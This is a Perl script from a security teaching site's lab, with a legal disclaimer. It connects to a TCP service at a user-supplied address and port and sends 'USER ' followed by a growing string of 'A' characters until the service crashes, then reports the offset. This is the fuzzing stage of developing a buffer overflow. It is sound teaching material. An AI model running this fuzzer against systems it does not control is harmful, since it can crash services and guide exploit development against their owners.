#!/usr/bin/perl

# - As a condition of your use of this Web site and Code, you warrant to computersecuritystudent.com
#   that you will not use this Web site or Code for any purpose that is unlawful or that is
#   prohibited by these terms, conditions, and notices.
# - In accordance with UCC § 2-316, this product is provided with "no warranties, either express or
#   implied." The information contained is provided "as-is", with "no guarantee of merchantability."
# - In addition, this is a teaching website that does not condone malicious behavior of any kind.
# - You are on notice, that continuing and/or using this lab and code outside your "own" test
#   environment is considered malicious and is against the law.
# - © 2016 No content replication of any kind is allowed without express written permission.
# - Authors: @bobmitch2311 and @HKD_student

# IO::Socket provides an object interface to creating and using sockets.
use IO::Socket;
 
# flush the print buffer immediately
$| = 1;

# Take in Standard Input
&get_info;


sub get_info
{
	print "Enter IP Address: ";
	chomp(my $target	= <stdin>);

	print "Enter Port Number: ";
	chomp(my $port		= <stdin>);

	print "Enter Fuzz Start Number: ";
	chomp(my $start_fuzz	= <stdin>);

	print "Enter Fuzz Stop Number: ";
	chomp(my $end_fuzz	= <stdin>);

	print "\n";

	if(($target eq "")||($port eq "")||($start_fuzz eq "")||($end_fuzz eq ""))
	{
		print "$0 Usage\n";
		print "-----------------------------------------------------------\n";
		print "$0 <IPADDRESS> <PORT> <START_FUZZ_NUM> <END_FUZZ_NUM>\n";
		print "-----------------------------------------------------------\n";
		print "E.g., ./fuzzer2.pl 192.168.2.106 1998 2020\n";
		exit;
	}
	else
	{
		&commence($target,$port,$start_fuzz,$end_fuzz);
	}
}

sub commence
{
	chomp(my $target 	= $_[0]);
	chomp(my $port	 	= $_[1]);
	chomp(my $start_fuzz 	= $_[2]);
	chomp(my $end_fuzz 	= $_[3]);

	my $num			= $start_fuzz;

	# Attempt Counter
	my $i			= 1;

	my $KEEP_RUNNING	= "T";

	# A Socket can still be established to the $IPADDRESS/PORT, -and-
	# The $end_fuzz is the amount of characters that you want to send has not been exceeded
	while(($KEEP_RUNNING eq "T")&&($num < $end_fuzz))
	{

		#Connect to port number
		my $socket = IO::Socket::INET->new(PeerAddr => $target , PeerPort => $port , Proto => 'tcp' , Timeout => 1);

		$buff_num  = ($num - 1);

		# Create a 1 second Alarm that will go off if the socket
		# does not return input to the $banner variable

		$SIG{ALRM} = sub { die "Crashed around: [$buff_num]\n" };
		alarm(1);

		# Attempt to grab the banner
		my $banner = <$socket>;

		alarm(0);


		#Check connection
		if($socket)
		{
			print "=======================================================\n";
			print "<Attempt $i>\n";
			print "IP Address: [$target] | Port: [$port] | [socket:$socket]\n";
			###print "==>Port $port is open: [socket:$socket]\n" ;
			print "Banner: $banner\n";

			&fuzzer($target,$port,$num);
		}
		else
		{
			#Port is closed, nothing to print
			print "[Port is Closed] IP Address: $target | Port: [$port] | [socket: *$socket*]\n";

			$KEEP_RUNNING	= "F";
			exit;
		}

		# Buffer/Offset Counter
		$num++;
	
		# Attempt Counter	
		$i++;
	}

}

sub fuzzer
{ 
	chomp(my $target 	= $_[0]);
	chomp(my $port	 	= $_[1]);
	chomp(my $fuznum 	= $_[2]);

	my $header		= "USER ";

	print "Fuzzing: [target:$target] [port:$port] [fuznum:$fuznum]\n";

	my $socket = IO::Socket::INET->new(Proto=>'tcp', PeerAddr=>$target, PeerPort=>$port);

	if($socket ne "")
	{
		my $exploit	= "\x41" x $fuznum;
		my $string	= $header.$exploit;

		print $socket $string;
		print "===> [Sending $fuznum \x41's]\n";

		system("sleep 1");

		print "Done....\n";

		close($socket);
	}
	else
	{
		my $offset = ($fuznum - 1);
		print "Fuzzing stopped around: $offset\n";

		close($socket);
		exit;
	}
}
